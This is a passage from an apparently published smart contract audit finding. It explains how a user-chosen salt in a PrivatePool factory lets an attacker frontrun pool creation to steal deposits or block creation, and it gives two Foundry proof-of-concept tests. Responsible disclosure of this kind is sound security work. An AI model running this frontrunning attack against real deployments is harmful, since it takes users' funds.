class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">InvalidEthAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// deploy a minimal proxy clone of the private pool implementation</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">PrivatePool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePoolImplementation</span><span class=\"mtk1\">.</span><span class=\"mtk11\">cloneDeterministic</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_salt</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The address of the new PrivatePool depends solely upon the <code>_salt</code> parameter provided by the user. Once the user’s create transaction is broadcasted, the <code>_salt</code> parameter can be viewed by anyone watching the public mempool.</p>\n<p>This public readability of <code>_salt</code> parameter creates two issues:</p>\n<ol>\n<li>\n<p>Stealing of user’s deposit amount.<br>\nIf a user intends to create new pool and deposit some funds in it then an attacker can frontrun the user’s txns and capture the deposit amounts. Here is how this can happen:</p>\n<ul>\n<li>User broadcasts two txns, first one to create a pool with <code>XXX</code> as the salt and second one to deposit some ETH into the new pool.</li>\n<li>The attacker views these pending txns and frontruns them to create a PrivatePool for himself with same <code>XXX</code> salt.</li>\n<li>The new pool gets created for the attacker, the address of this pool will be same as what the user will be expecting for his pool.</li>\n<li>The user’s create pool txn gets reverted but deposit txn gets executed successfully. Hence the user deposited ETH in  attacker’s pool.</li>\n<li>Being the owner of the pool the attacker simply withdraws the deposited ETH from the PrivatePool.</li>\n</ul>\n</li>\n<li>\n<p>DoS for <code>Factory.create</code>.<br>\nIf a user intends to create a PrivatePool, his create txn can be forcefully reverted by an attacker by deploying a pool for himself using the user’s salt. Here is how this can happen:</p>\n<ul>\n<li>The user broadcasts the create pool txn with salt <code>XXX</code>.</li>\n<li>The attacker frontruns the user’s txn and creates a pool for hiself using the same <code>XXX</code> salt.</li>\n<li>The user’s original create txn gets reverted as attacker’s pool already exist on the predetermined address.</li>\n<li>This attack can be repeated again and again resulting in DoS for the <code>Factory.create</code> function.</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>These test cases were added to <code>test/PrivatePool/Withdraw.t.sol</code> file and were ran using <code>forge test --ffi --mp test/PrivatePool/Withdraw.t.sol --mt test_audit</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_audit_create_stealDeposit</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;user1&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">predictedAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">predictPoolDeploymentAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// tries to create pool and deposit funds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 1. factory.create(...)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 2. pool.deposit(...)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// but user2 frontruns the txns</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user2</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;user2&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">create</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">virtualNftReserves</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">feeRate</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">true</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">baseTokenAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">predictedAddress</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint160</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">)))), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LibClone</span><span class=\"mtk1\">.</span><span class=\"mtk12\">DeploymentFailed</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">create</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">virtualNftReserves</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">feeRate</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">true</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">baseTokenAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_audit_create_DoS</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;user1&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">predictedAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">predictPoolDeploymentAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// user1 tries to create pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// factory.create(...)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// but user2 frontruns the txn</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user2</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;user2&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">create</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">virtualNftReserves</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">feeRate</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">true</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">baseTokenAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">predictedAddress</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint160</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">)))), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LibClone</span><span class=\"mtk1\">.</span><span class=\"mtk12\">DeploymentFailed</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">create</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">virtualNftReserves</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">feeRate</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">true</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">baseTokenAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-6\" style=\"position:relative;\"><a href=\"#tools-used-6\" aria-label=\"tools used 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 